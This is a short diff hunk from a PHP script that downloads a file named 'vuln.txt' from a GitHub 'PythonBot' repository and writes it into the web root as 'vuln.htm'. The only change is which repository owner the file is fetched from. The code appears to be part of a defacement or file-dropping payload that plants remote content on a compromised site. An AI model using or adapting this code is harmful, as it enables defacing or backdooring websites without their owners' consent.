@@ -21,7 +21,7 @@ if(file_exists($check)){
 echo "done .\n " ;
 
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
-$text2 = http_get('https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/vuln.txt');
+$text2 = http_get('https://raw.githubusercontent.com/mrxmod/PythonBot/master/files/vuln.txt');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
